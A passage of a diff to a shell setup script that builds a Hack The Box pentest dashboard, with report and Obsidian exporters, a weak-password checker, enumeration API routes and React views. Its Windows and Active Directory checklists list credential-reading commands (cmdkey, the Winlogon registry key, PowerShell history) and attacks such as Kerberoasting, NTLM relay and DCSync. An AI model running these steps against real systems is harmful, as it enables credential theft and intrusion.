+- [ ] ASP/ASPX-specific testing
+- [ ] WebDAV check
+- [ ] Default IIS pages / web.config exposure
+
+### Exploitation
+- [ ] CVE lookup for discovered services
+- [ ] SMB exploits (MS17-010 EternalBlue, etc.)
+- [ ] Check for guest/anonymous SMB access
+- [ ] Password spray against SMB/WinRM/RDP
+- [ ] Attempt exploit, catch shell
+
+### Post-Exploitation (Windows)
+- [ ] `whoami /all` — privileges and groups
+- [ ] `net user` / `net localgroup administrators`
+- [ ] `systeminfo` — OS, patches
+- [ ] `Get-HotFix` — missing patches
+- [ ] AlwaysInstallElevated check
+- [ ] Unquoted service paths: `wmic service get pathname`
+- [ ] Weak service permissions: `accesschk.exe`
+- [ ] Stored credentials: `cmdkey /list`
+- [ ] Registry auto-logon: `reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`
+- [ ] Run WinPEAS
+- [ ] Check for PowerShell history: `%AppData%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt`
+- [ ] Token impersonation (SeImpersonatePrivilege)
+
+### Flags
+- [ ] User flag: `type C:\\Users\\{user}\\Desktop\\user.txt`
+- [ ] Root/Admin flag: `type C:\\Users\\Administrator\\Desktop\\root.txt`
+"""
+
+METHODOLOGY_AD = """
+## Methodology Checklist — Active Directory Box
+
+### Initial Recon
+- [ ] Domain controller identification (port 88, 389, 636, 3268)
+- [ ] LDAP anonymous bind attempt
+- [ ] DNS enumeration for domain
+- [ ] SMB null session enumeration
+
+### AD Enumeration
+- [ ] BloodHound/SharpHound collection
+- [ ] LDAP user/computer enumeration
+- [ ] Kerberoastable accounts (SPN users)
+- [ ] ASREPRoastable accounts (no preauth)
+- [ ] Domain Admins / privileged groups
+- [ ] ACL analysis for misconfigured permissions
+- [ ] GPO enumeration
+- [ ] Trust relationships
+
+### Initial Access
+- [ ] Password spray (Kerbrute)
+- [ ] AS-REP roasting
+- [ ] Kerberoasting
+- [ ] Anonymous/guest SMB shares
+- [ ] PrintNightmare / ZeroLogon / noPac checks
+
+### Lateral Movement
+- [ ] Pass-the-Hash
+- [ ] Pass-the-Ticket
+- [ ] Credential relay (Responder + ntlmrelayx)
+- [ ] Constrained/unconstrained delegation abuse
+- [ ] DCSync (if DCSyncable account found)
+
+### Flags
+- [ ] Domain User flag
+- [ ] Domain Admin / root flag
+"""
+
+
+def build_htb_report(
+    scan_id: str,
+    box_name: str = "",
+    difficulty: str = "Medium",
+    box_type: str = "linux",
+    attack_path: str = "",
+    flags: Optional[dict] = None,
+) -> Optional[str]:
+    try:
+        with closing(get_db()) as db:
+            row = db.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
+            if not row:
+                return None
+            notes = db.execute(
+                "SELECT content, author, created_at FROM notes WHERE scan_id=? ORDER BY created_at",
+                (scan_id,),
+            ).fetchall()
+
+        data = json.loads(row["data"] or "{}")
+        services = data.get("services", {})
+        cves = data.get("cves", {})
+        flags = flags or {}
+
+        methodology = {
+            "linux": METHODOLOGY_LINUX,
+            "windows": METHODOLOGY_WINDOWS,
+            "ad": METHODOLOGY_AD,
+        }.get(box_type.lower(), METHODOLOGY_LINUX)
+
+        ports_str = ", ".join(services.keys())
+        methodology = methodology.format(target=row["target"], ports=ports_str)
+
+        now = datetime.now(timezone.utc).strftime("%Y-%m-%d")
+
+        lines = [
+            f"# HTB — {box_name or row['target']}",
+            f"**Difficulty:** {difficulty}  |  **OS:** {row.get('os_hint') or box_type.title()}  |  **Date:** {now}",
+            f"**IP:** `{row['target']}`  |  **Scan ID:** `{scan_id[:8]}`",
+            "",
+            "---",
+            "",
+            "## Executive Summary",
+            "",
+            f"> *{box_name or 'Target'}* is a {difficulty} {box_type.title()} machine. "
+            f"{len(services)} open service(s) were identified. "
+            f"{'Critical CVEs were found. ' if any(any(c.get('severity') == 'CRITICAL' for c in cv) for cv in cves.values()) else ''}"
+            f"{'Root access was achieved. ' if flags.get('root') else ''}",
+            "",
+            "---",
+            "",
+            "## Attack Path",
+            "",
+            attack_path or "_Document your attack path here: initial foothold → privilege escalation → root._",
+            "",
+            "---",
+            "",
+            f"## Open Services ({len(services)} found)",
+            "",
+        ]
+
+        for port, info in services.items():
+            port_cves = cves.get(port, [])
+            crit = [c for c in port_cves if c.get("severity") == "CRITICAL"]
+            lines.append(f"### :{port}/{info.get('proto','tcp')} — {info.get('service','?')} {info.get('product','')} {info.get('version','')}")
+            if port_cves:
+                lines.append(f"**CVEs:** {len(port_cves)} ({len(crit)} critical)")
+                for cve in port_cves[:3]:
+                    lines.append(f"- `{cve['id']}` CVSS:{cve.get('score','?')} {cve.get('severity','?')} — {(cve.get('description') or '')[:120]}")
+            lines.append("")
+
+        lines += [
+            "---",
+            "",
+            "## Flags",
+            "",
+            f"**User flag:** `{flags.get('user', '???')}`",
+            f"**Root flag:** `{flags.get('root', '???')}`",
+            "",
+            "---",
+            "",
+            "## Proof Screenshots",
+            "",
+            "_Attach screenshots of user.txt and root.txt here._",
+            "",
+            "---",
+            "",
+        ]
+
+        lines.append(methodology)
+
+        if notes:
+            lines += ["---", "", "## Analyst Notes", ""]
+            for note in notes:
+                lines.append(f"**{note['author']} @ {note['created_at']}:** {note['content']}")
+                lines.append("")
+
+        return "\n".join(lines)
+    except Exception as exc:
+        logger.error(f"HTB report failed for {scan_id}: {exc}")
+        return None
+PY
+
+# ── Obsidian Vault Export ─────────────────────────────────────────────────────
+cat > "$BASE/plugins/obsidian_exporter.py" <<'PY'
+import json
+import logging
+import os
+from contextlib import closing
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Optional
+
+from core.db_engine import get_db
+
+logger = logging.getLogger(__name__)
+
+
+def _build_summary(row: dict, data: dict, label: str, difficulty: str, box_type: str) -> str:
+    now = datetime.now(timezone.utc).strftime("%Y-%m-%d")
+    services = data.get("services", {})
+    cves = data.get("cves", {})
+    lines = [
+        f"# {label}",
+        f"**Target:** `{row['target']}`  |  **OS:** {row.get('os_hint') or box_type.title()}  |  **Date:** {now}",
+        f"**Difficulty:** {difficulty}  |  **Status:** {row.get('status', 'COMPLETE')}",
+        "",
+        "## Open Services",
+        "",
+    ]
+    for port, info in services.items():
+        port_cves = cves.get(port, [])
+        lines.append(f"### :{port}/{info.get('proto','tcp')} — {info.get('service','?')} {info.get('product','')} {info.get('version','')}")
+        for cve in port_cves[:3]:
+            lines.append(f"- `{cve['id']}` CVSS:{cve.get('score','?')} **{cve.get('severity','?')}**")
+        lines.append("")
+    return "\n".join(lines)
+
+
+def export_obsidian_vault(
+    scan_id: str,
+    vault_path: str,
+    box_name: str = "",
+    difficulty: str = "Medium",
+    box_type: str = "linux",
+) -> Optional[str]:
+    try:
+        with closing(get_db()) as db:
+            row = db.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
+            if not row:
+                return None
+
+        data = json.loads(row["data"] or "{}")
+        services = data.get("services", {})
+        cves = data.get("cves", {})
+        target = row["target"]
+        box_label = box_name or target
+
+        vault = Path(vault_path)
+        box_dir = vault / "Engagements" / box_label
+        box_dir.mkdir(parents=True, exist_ok=True)
+
+        # Main note
+        main_report = _build_summary(dict(row), data, box_label, difficulty, box_type)
+        if main_report:
+            (box_dir / "README.md").write_text(main_report, encoding="utf-8")
+
+        # Services note
+        svc_lines = [f"# {box_label} — Services\n", f"Target: `{target}`\n"]
+        for port, info in services.items():
+            svc_lines.append(f"## Port {port}")
+            svc_lines.append(f"- **Service:** {info.get('service')}")
+            svc_lines.append(f"- **Product:** {info.get('product')}")
+            svc_lines.append(f"- **Version:** {info.get('version')}")
+            banner = info.get("banner")
+            if banner:
+                svc_lines.append(f"- **Banner:** `{banner[:200]}`")
+            svc_lines.append("")
+        (box_dir / "Services.md").write_text("\n".join(svc_lines), encoding="utf-8")
+
+        # CVEs note
+        cve_lines = [f"# {box_label} — CVEs\n"]
+        for port, port_cves in cves.items():
+            if port_cves:
+                cve_lines.append(f"## Port {port}")
+                for cve in port_cves:
+                    cve_lines.append(f"- [{cve['id']}](https://nvd.nist.gov/vuln/detail/{cve['id']}) CVSS:{cve.get('score','?')} **{cve.get('severity','?')}**")
+                    cve_lines.append(f"  > {(cve.get('description') or '')[:200]}")
+                cve_lines.append("")
+        (box_dir / "CVEs.md").write_text("\n".join(cve_lines), encoding="utf-8")
+
+        # Attack notes template
+        attack_template = f"""# {box_label} — Attack Notes
+
+## Foothold
+_Document how you got initial access here._
+
+## Lateral Movement
+_Document any pivoting or lateral movement._
+
+## Privilege Escalation
+_Document privesc steps here._
+
+## Key Findings
+- 
+
+## Credentials Found
+| Username | Password | Service | Valid |
+|----------|----------|---------|-------|
+|          |          |         |       |
+
+## Commands Used
+```bash
+# Initial recon
+nmap -sV -sC {target}
+```
+
+## References
+- 
+"""
+        (box_dir / "AttackNotes.md").write_text(attack_template, encoding="utf-8")
+
+        # Index note with backlinks
+        index_lines = [
+            f"# {box_label}",
+            f"**IP:** `{target}`  **Difficulty:** {difficulty}  **Type:** {box_type.title()}",
+            f"**Date:** {datetime.now(timezone.utc).strftime('%Y-%m-%d')}",
+            "",
+            "## Notes",
+            f"- [[{box_label}/README|Full Report]]",
+            f"- [[{box_label}/Services|Services]]",
+            f"- [[{box_label}/CVEs|CVEs]]",
+            f"- [[{box_label}/AttackNotes|Attack Notes]]",
+            "",
+            "## Tags",
+            f"#pentest #{difficulty.lower()} #{box_type.lower()}",
+        ]
+        (vault / "Engagements" / f"{box_label}.md").write_text("\n".join(index_lines), encoding="utf-8")
+
+        return str(box_dir)
+    except Exception as exc:
+        logger.error(f"Obsidian export failed: {exc}")
+        return None
+PY
+
+# ── Weak Password Detector ────────────────────────────────────────────────────
+cat > "$BASE/plugins/weak_password_detector.py" <<'PY'
+import logging
+import re
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+WEAK_PATTERNS = [
+    (re.compile(r"^(.)\1+$"), "Repeated character"),
+    (re.compile(r"^(012|123|234|345|456|567|678|789|890|987|876|765|654|543|432|321|210)", re.IGNORECASE), "Sequential digits"),
+    (re.compile(r"^(abc|bcd|cde|def|efg|fgh|ghi|hij|ijk|jkl|klm|lmn|mno|nop|opq|pqr|qrs|rst|stu|tuv|uvw|vwx|wxy|xyz)", re.IGNORECASE), "Sequential letters"),
+    (re.compile(r"^(password|passwd|pass|pwd)", re.IGNORECASE), "Contains 'password'"),
+    (re.compile(r"^(admin|administrator|root|user|guest|test|default|login)", re.IGNORECASE), "Common username-as-password"),
+    (re.compile(r"^(qwerty|azerty|dvorak|qazwsx|zxcvbn)", re.IGNORECASE), "Keyboard walk"),
+    (re.compile(r"^(letmein|welcome|monkey|dragon|sunshine|master|iloveyou|trustno1|football|shadow|baseball|baseball|batman|superman)", re.IGNORECASE), "Common password"),
+    (re.compile(r"^\d{4}$"), "4-digit PIN"),
+    (re.compile(r"^\d{6}$"), "6-digit PIN"),
+    (re.compile(r"^.{1,5}$"), "Too short (< 6 chars)"),
+    (re.compile(r"^[a-z]+$"), "Lowercase only"),
+    (re.compile(r"^[A-Z]+$"), "Uppercase only"),
+    (re.compile(r"^\d+$"), "Digits only"),
+    (re.compile(r"^[a-zA-Z]+\d{1,4}$"), "Word + short number suffix"),
+    (re.compile(r"(19|20)\d{2}$"), "Ends with year"),
+    (re.compile(r"!+$"), "Only special char is trailing '!'"),
+]
+
+COMMON_PASSWORDS_SET = {
+    "password", "123456", "12345678", "password1", "qwerty",
+    "abc123", "monkey", "letmein", "dragon", "111111",
+    "baseball", "iloveyou", "trustno1", "sunshine", "master",
+    "welcome", "shadow", "superman", "batman", "admin",
+    "root", "pass", "guest", "default", "changeme",
+    "passw0rd", "p@ssword", "p@ssw0rd", "admin123", "root123",
+}
+
+ENTROPY_CLASSES = [
+    (re.compile(r"[a-z]"), "lowercase"),
+    (re.compile(r"[A-Z]"), "uppercase"),
+    (re.compile(r"\d"), "digits"),
+    (re.compile(r"[^a-zA-Z0-9]"), "special"),
+]
+
+
+def _check_entropy(password: str) -> dict:
+    classes = [name for pattern, name in ENTROPY_CLASSES if pattern.search(password)]
+    length = len(password)
+    score = len(classes) + min(length // 4, 4)
+    if length < 8:
+        score = max(0, score - 2)
+    return {
+        "length": length,
+        "classes": classes,
+        "class_count": len(classes),
+        "score": score,
+        "strength": "WEAK" if score < 3 else "MEDIUM" if score < 5 else "STRONG",
+    }
+
+
+def analyze_password(password: str) -> dict:
+    weaknesses = []
+
+    if password.lower() in COMMON_PASSWORDS_SET:
+        weaknesses.append("In common password list")
+
+    for pattern, label in WEAK_PATTERNS:
+        if pattern.search(password):
+            weaknesses.append(label)
+
+    entropy = _check_entropy(password)
+
+    return {
+        "password": password[:4] + "***" if len(password) > 4 else "***",
+        "length": len(password),
+        "weaknesses": list(set(weaknesses)),
+        "is_weak": len(weaknesses) > 0 or entropy["strength"] == "WEAK",
+        "entropy": entropy,
+        "risk": "CRITICAL" if password.lower() in COMMON_PASSWORDS_SET else
+                "HIGH" if len(weaknesses) > 2 else
+                "MEDIUM" if weaknesses else "LOW",
+    }
+
+
+def analyze_credential_list(credentials: list) -> dict:
+    results = []
+    weak_count = 0
+    for cred in credentials:
+        pw = cred.get("password", "")
+        if not pw:
+            continue
+        analysis = analyze_password(pw)
+        analysis["username"] = cred.get("username", "")
+        analysis["host"] = cred.get("host", "")
+        if analysis["is_weak"]:
+            weak_count += 1
+        results.append(analysis)
+
+    return {
+        "total_analyzed": len(results),
+        "weak_count": weak_count,
+        "weak_percentage": round(weak_count / len(results) * 100, 1) if results else 0,
+        "results": results,
+    }
+PY
+
+# ── CVE Heatmap Data Builder ──────────────────────────────────────────────────
+cat > "$BASE/plugins/cve_heatmap.py" <<'PY'
+import json
+import logging
+from contextlib import closing
+from typing import Optional
+
+from core.db_engine import get_db
+
+logger = logging.getLogger(__name__)
+
+SEVERITY_WEIGHTS = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "UNKNOWN": 0}
+
+
+def build_heatmap(target: Optional[str] = None, limit: int = 50) -> dict:
+    try:
+        with closing(get_db()) as db:
+            if target:
+                rows = db.execute(
+                    "SELECT id, target, created_at, data FROM scans WHERE target=? AND status='COMPLETE' ORDER BY created_at ASC LIMIT ?",
+                    (target, limit),
+                ).fetchall()
+            else:
+                rows = db.execute(
+                    "SELECT id, target, created_at, data FROM scans WHERE status='COMPLETE' ORDER BY created_at DESC LIMIT ?",
+                    (limit,),
+                ).fetchall()
+
+        points = []
+        targets_seen = set()
+
+        for row in rows:
+            data = json.loads(row["data"] or "{}")
+            cves_by_port = data.get("cves", {})
+            targets_seen.add(row["target"])
+
+            counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "total": 0}
+            score_total = 0
+
+            for port_cves in cves_by_port.values():
+                for cve in port_cves:
+                    sev = cve.get("severity", "UNKNOWN")
+                    counts[sev] = counts.get(sev, 0) + 1
+                    counts["total"] += 1
+                    score_total += SEVERITY_WEIGHTS.get(sev, 0)
+
+            points.append({
+                "scan_id": row["id"],
+                "target": row["target"],
+                "date": row["created_at"],
+                "counts": counts,
+                "risk_score": score_total,
+                "severity_breakdown": {k: v for k, v in counts.items() if k != "total"},
+            })
+
+        # Per-target trend lines
+        by_target = {}
+        for p in points:
+            by_target.setdefault(p["target"], []).append(p)
+
+        return {
+            "points": points,
+            "by_target": by_target,
+            "targets": list(targets_seen),
+            "summary": {
+                "total_scans": len(points),
+                "max_risk_score": max((p["risk_score"] for p in points), default=0),
+                "avg_risk_score": round(sum(p["risk_score"] for p in points) / len(points), 2) if points else 0,
+            },
+        }
+    except Exception as exc:
+        logger.error(f"Heatmap build failed: {exc}")
+        return {"points": [], "by_target": {}, "targets": [], "summary": {}}
+PY
+
+# ── Append new API routes ─────────────────────────────────────────────────────
+cat >> "$BASE/dashboard/app.py" <<'PYROUTES2'
+
+# ── Recon & Enumeration Routes ────────────────────────────────────────────────
+from plugins.smb_enum import enumerate_smb
+from plugins.snmp_walker import walk_snmp
+from plugins.ldap_enum import enumerate_ldap
+from plugins.banner_grabber import grab_all_banners
+from plugins.screenshot_labeler import get_labels
+from plugins.obsidian_exporter import export_obsidian_vault
+from plugins.weak_password_detector import analyze_password, analyze_credential_list
+from plugins.cve_heatmap import build_heatmap
+
+
+class SmbRequest(BaseModel):
+    pass  # uses scan target
+
+
+class SnmpRequest(BaseModel):
+    community: Optional[str] = Field(default=None, max_length=50)
+    port: int = Field(default=161, ge=1, le=65535)
+
+
+class LdapRequest(BaseModel):
+    port: int = Field(default=389, ge=1, le=65535)
+    username: str = Field(default="")
+    password: str = Field(default="")
+    base_dn: str = Field(default="")
+    use_ssl: bool = Field(default=False)
+
+
+class ObsidianRequest(BaseModel):
+    vault_path: str = Field(..., min_length=1, max_length=500)
+    box_name: str = Field(default="", max_length=100)
+    difficulty: str = Field(default="Medium")
+    box_type: str = Field(default="linux")
+
+
+class WeakPasswordRequest(BaseModel):
+    passwords: List[str] = Field(..., min_length=1, max_length=500)
+
+
+@app.post("/scans/{scan_id}/smb")
+def smb_enumerate(scan_id: str, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT target FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = enumerate_smb(row["target"])
+    log_event(scan_id, "smb_enumerated",
+              f"{len(result.get('users_found',[]))} users, {len(result.get('shares_found',[]))} shares",
+              actor=user["username"])
+    return result
+
+
+@app.post("/scans/{scan_id}/snmp")
+def snmp_walk(scan_id: str, request: SnmpRequest, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT target FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = walk_snmp(row["target"], community=request.community, port=request.port)
+    log_event(scan_id, "snmp_walked",
+              f"Community: {result.get('community','none')}, {result.get('line_count',0)} lines",
+              actor=user["username"])
+    return result
+
+
+@app.post("/scans/{scan_id}/ldap")
+def ldap_enumerate(scan_id: str, request: LdapRequest, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT target FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = enumerate_ldap(row["target"], port=request.port, username=request.username,
+                            password=request.password, base_dn=request.base_dn, use_ssl=request.use_ssl)
+    summary = result.get("summary", {})
+    log_event(scan_id, "ldap_enumerated",
+              f"{summary.get('users',0)} users, {summary.get('kerberoastable',0)} kerberoastable",
+              actor=user["username"])
+    return result
+
+
+@app.post("/scans/{scan_id}/banners")
+def banner_grab(scan_id: str, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT target, data FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    data = json.loads(row["data"] or "{}")
+    services = data.get("services", {})
+    ports = [int(p) for p in services.keys()]
+    if not ports:
+        return {"target": row["target"], "banners": {}}
+    result = grab_all_banners(row["target"], ports)
+    log_event(scan_id, "banners_grabbed", f"{len(result)} ports probed", actor=user["username"])
+    return {"target": row["target"], "banners": result}
+
+
+@app.post("/scans/{scan_id}/obsidian")
+def obsidian_export(scan_id: str, request: ObsidianRequest, user: dict = Depends(verify_token)) -> dict:
+    path = export_obsidian_vault(
+        scan_id, vault_path=request.vault_path, box_name=request.box_name,
+        difficulty=request.difficulty, box_type=request.box_type,
+    )
+    if not path:
+        raise HTTPException(status_code=500, detail="Obsidian export failed")
+    log_event(scan_id, "obsidian_exported", f"Vault: {request.vault_path}", actor=user["username"])
+    return {"path": path, "message": "Vault exported successfully"}
+
+
+@app.get("/scans/{scan_id}/screenshot-labels")
+def screenshot_labels(scan_id: str, user: dict = Depends(verify_token)) -> dict:
+    labels = get_labels(scan_id)
+    return {"scan_id": scan_id, "labels": labels, "count": len(labels)}
+
+
+@app.get("/heatmap")
+def cve_heatmap(target: Optional[str] = Query(None), user: dict = Depends(verify_token)) -> dict:
+    return build_heatmap(target=target)
+
+
+@app.post("/passwords/analyze")
+def analyze_passwords(request: WeakPasswordRequest, user: dict = Depends(verify_token)) -> dict:
+    results = [analyze_password(p) for p in request.passwords]
+    weak = [r for r in results if r["is_weak"]]
+    return {"total": len(results), "weak": len(weak), "results": results}
+
+
+@app.get("/credentials/weak-analysis")
+def weak_cred_analysis(user: dict = Depends(verify_token)) -> dict:
+    from plugins.credential_tracker import get_credentials
+    creds = get_credentials()
+    return analyze_credential_list(creds)
+PYROUTES2
+
+# ── Append new UI tabs to App.jsx (graph, live stream, side-by-side diff) ────
+cat >> "$UI/src/App.jsx" <<'JSXPATCH'
+
+// ── Attack Path Graph (appended component) ────────────────────────────────────
+// Import via: import { AttackGraph } from './AttackGraph.jsx'  (auto-generated below)
+JSXPATCH
+
+cat > "$UI/src/AttackGraph.jsx" <<'JSX'
+import { useEffect, useRef, useState } from "react";
+
+const S = {
+  canvas: { width: "100%", height: 520, background: "#0f172a", borderRadius: 8, border: "1px solid #334155", display: "block" },
+  node: { fill: "#1e293b", stroke: "#38bdf8", r: 28 },
+  edge: { stroke: "#475569", strokeWidth: 1.5 },
+  label: { fill: "#e2e8f0", fontSize: 11, textAnchor: "middle" },
+};
+
+const SEV_COLOR = { CRITICAL: "#ef4444", HIGH: "#f97316", MEDIUM: "#f59e0b", LOW: "#22c55e", UNKNOWN: "#64748b" };
+
+function layout(nodes, edges) {
+  // Simple force-directed layout approximation
+  const positions = {};
+  const count = nodes.length;
+  nodes.forEach((n, i) => {
+    const angle = (i / count) * 2 * Math.PI;
+    const r = Math.min(200, 60 * count);
+    positions[n.id] = { x: 400 + r * Math.cos(angle), y: 260 + r * Math.sin(angle) };
+  });
+  return positions;
+}
+
+export function AttackGraph({ scan }) {
+  const svgRef = useRef(null);
+  const [tooltip, setTooltip] = useState(null);
+
+  if (!scan) return null;
+
+  const services = scan.data?.services || {};
+  const cves = scan.data?.cves || {};
+
+  // Build graph nodes and edges
+  const targetNode = { id: "target", label: scan.target, type: "target", color: "#6366f1" };
+  const serviceNodes = Object.entries(services).map(([port, info]) => {
+    const portCves = cves[port] || [];
+    const maxSev = portCves.reduce((acc, c) => {
+      const order = ["CRITICAL","HIGH","MEDIUM","LOW","UNKNOWN"];
+      return order.indexOf(c.severity) < order.indexOf(acc) ? c.severity : acc;
+    }, "UNKNOWN");
+    return {
+      id: `port_${port}`,
+      label: `:${port}\n${info.service || "?"}`,
+      type: "service",
+      color: SEV_COLOR[maxSev] || "#64748b",
+      port, info, cves: portCves, severity: maxSev,
+    };
+  });
+
+  const nodes = [targetNode, ...serviceNodes];
+  const edges = serviceNodes.map(n => ({ from: "target", to: n.id }));
+  const positions = layout(nodes, edges);
+
+  return (
+    <div>
+      <h3 style={{ margin: "0 0 12px", color: "#e2e8f0" }}>Attack Path Graph</h3>
+      <p style={{ fontSize: 12, color: "#64748b", marginBottom: 8 }}>
+        Node color = highest CVE severity. Hover for details.
+      </p>
+      <svg ref={svgRef} style={S.canvas} viewBox="0 0 800 520">
+        <defs>
+          <marker id="arrow" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L8,3 z" fill="#475569" />
+          </marker>
+        </defs>
+
+        {edges.map((e, i) => {
+          const from = positions[e.from];
+          const to = positions[e.to];
+          if (!from || !to) return null;
+          const dx = to.x - from.x, dy = to.y - from.y;
+          const len = Math.sqrt(dx * dx + dy * dy);
+          const ux = dx / len, uy = dy / len;
+          return (
+            <line key={i}
+              x1={from.x + ux * 30} y1={from.y + uy * 30}
+              x2={to.x - ux * 32} y2={to.y - uy * 32}
+              stroke="#475569" strokeWidth={1.5} markerEnd="url(#arrow)"
+            />
+          );
+        })}
+
+        {nodes.map(node => {
+          const pos = positions[node.id];
+          if (!pos) return null;
+          const lines = node.label.split("\n");
+          return (
+            <g key={node.id}
+              style={{ cursor: "pointer" }}
+              onMouseEnter={() => setTooltip({ node, pos })}
+              onMouseLeave={() => setTooltip(null)}
+            >
+              <circle cx={pos.x} cy={pos.y} r={28}
+                fill={node.type === "target" ? "#1e3a8a" : "#1e293b"}
+                stroke={node.color} strokeWidth={2.5}
+              />
+              {lines.map((line, i) => (
+                <text key={i} x={pos.x} y={pos.y + (i - (lines.length - 1) / 2) * 13}
+                  textAnchor="middle" fill="#e2e8f0" fontSize={10} fontFamily="monospace">
+                  {line}
+                </text>
+              ))}
+            </g>
+          );
+        })}
+
+        {tooltip && (() => {
+          const { node, pos } = tooltip;
+          const tx = Math.min(pos.x + 36, 680);
+          const ty = Math.max(pos.y - 60, 10);
+          const portCves = node.cves || [];
+          return (
+            <g>
+              <rect x={tx} y={ty} width={200} height={60 + portCves.length * 14}
+                fill="#1e293b" stroke="#334155" rx={6} opacity={0.97} />
+              <text x={tx + 8} y={ty + 16} fill="#38bdf8" fontSize={11} fontWeight="bold">
+                {node.type === "target" ? node.label : `Port ${node.port}`}
+              </text>
+              {node.info && (
+                <text x={tx + 8} y={ty + 30} fill="#94a3b8" fontSize={10}>
+                  {node.info.service} {node.info.version}
+                </text>
+              )}
+              {portCves.slice(0, 3).map((cve, i) => (
+                <text key={cve.id} x={tx + 8} y={ty + 46 + i * 14}
+                  fill={SEV_COLOR[cve.severity] || "#94a3b8"} fontSize={9}>
+                  {cve.id} ({cve.severity})
+                </text>
+              ))}
+            </g>
+          );
+        })()}
+      </svg>
+
+      <div style={{ display: "flex", gap: 12, marginTop: 12, flexWrap: "wrap" }}>
+        {Object.entries(SEV_COLOR).map(([sev, color]) => (
+          <span key={sev} style={{ fontSize: 12, color, display: "flex", alignItems: "center", gap: 4 }}>
+            <svg width={10} height={10}><circle cx={5} cy={5} r={5} fill={color} /></svg>
+            {sev}
+          </span>
+        ))}
+      </div>
+    </div>
+  );
+}
+JSX
+
+cat > "$UI/src/LiveTerminal.jsx" <<'JSX'
+import { useCallback, useEffect, useRef, useState } from "react";
+
+const S = {
+  terminal: {
+    background: "#020617", borderRadius: 8, padding: 16, fontFamily: "monospace",
+    fontSize: 12, color: "#22c55e", height: 320, overflowY: "auto",
+    border: "1px solid #1e293b", whiteSpace: "pre-wrap", wordBreak: "break-all",
+  },
+  header: { display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 8 },
+  dot: (color) => ({ width: 10, height: 10, borderRadius: "50%", background: color, display: "inline-block", marginRight: 4 }),
+  line: (type) => ({
+    color: type === "error" ? "#ef4444" : type === "warn" ? "#f59e0b" : type === "info" ? "#38bdf8" : "#22c55e",
+  }),
+};
+
+export function LiveTerminal({ api, scanId, active }) {
+  const [lines, setLines] = useState([]);
+  const [connected, setConnected] = useState(false);
+  const bottomRef = useRef(null);
+  const pollRef = useRef(null);
+  const lastEventRef = useRef(0);
+
+  const poll = useCallback(async () => {
+    if (!scanId || !active) return;
+    try {
+      const { data } = await api.get(`/scans/${scanId}/timeline`);
+      const events = data.events || [];
+      const newEvents = events.slice(lastEventRef.current);
+      if (newEvents.length > 0) {
+        lastEventRef.current = events.length;
+        setLines(prev => [
+          ...prev,
+          ...newEvents.map(e => ({
+            text: `[${e.created_at}] [${e.actor}] ${e.event}${e.detail ? ": " + e.detail : ""}`,
+            type: e.event.includes("fail") ? "error" : e.event.includes("warn") ? "warn" :
+                  e.event.includes("queue") ? "info" : "ok",
+          })),
+        ]);
+      }
+      setConnected(true);
+    } catch {
+      setConnected(false);
+    }
+  }, [api, scanId, active]);
+
+  useEffect(() => {
+    if (!active) return;
+    setLines([{ text: `[terminal] Monitoring scan ${scanId?.slice(0, 8)}...`, type: "info" }]);
+    lastEventRef.current = 0;
+    poll();
+    pollRef.current = setInterval(poll, 2500);
+    return () => clearInterval(pollRef.current);
+  }, [scanId, active, poll]);
+
+  useEffect(() => {
+    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
+  }, [lines]);
+
+  return (
+    <div>
+      <div style={S.header}>
+        <h3 style={{ margin: 0, color: "#e2e8f0" }}>Live Terminal</h3>
+        <span style={{ fontSize: 12 }}>
+          <span style={S.dot(connected ? "#22c55e" : "#ef4444")} />
+          {connected ? "Connected" : "Disconnected"}
+        </span>
+      </div>
+      <div style={S.terminal}>
+        {lines.map((line, i) => (
+          <div key={i} style={S.line(line.type)}>{line.text}</div>
+        ))}
+        <div ref={bottomRef} />
+      </div>
+      <div style={{ display: "flex", gap: 8, marginTop: 8 }}>
+        <button
+          style={{ padding: "4px 12px", background: "#1e293b", color: "#94a3b8", border: "1px solid #334155", borderRadius: 4, cursor: "pointer", fontSize: 12 }}
+          onClick={() => setLines([])}
+        >Clear</button>
+        <span style={{ fontSize: 11, color: "#475569", alignSelf: "center" }}>{lines.length} events</span>
+      </div>
+    </div>
+  );
+}
+JSX
+
+cat > "$UI/src/SideBySideDiff.jsx" <<'JSX'
+import { useState } from "react";
+
+const S = {
+  grid: { display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginTop: 12 },
+  col: { background: "#0f172a", borderRadius: 8, padding: 14, border: "1px solid #1e293b" },
+  header: { fontWeight: 700, color: "#38bdf8", marginBottom: 12, fontSize: 14 },
+  row: (color) => ({
+    padding: "6px 10px", borderRadius: 4, marginBottom: 4, fontSize: 12,
+    background: color === "green" ? "#052e16" : color === "red" ? "#1c0404" : color === "yellow" ? "#1c1200" : "#1e293b",
+    borderLeft: `3px solid ${color === "green" ? "#22c55e" : color === "red" ? "#ef4444" : color === "yellow" ? "#f59e0b" : "#334155"}`,
+    color: "#e2e8f0",
+  }),
+  badge: (color) => ({
+    display: "inline-block", padding: "1px 7px", borderRadius: 10, fontSize: 10,
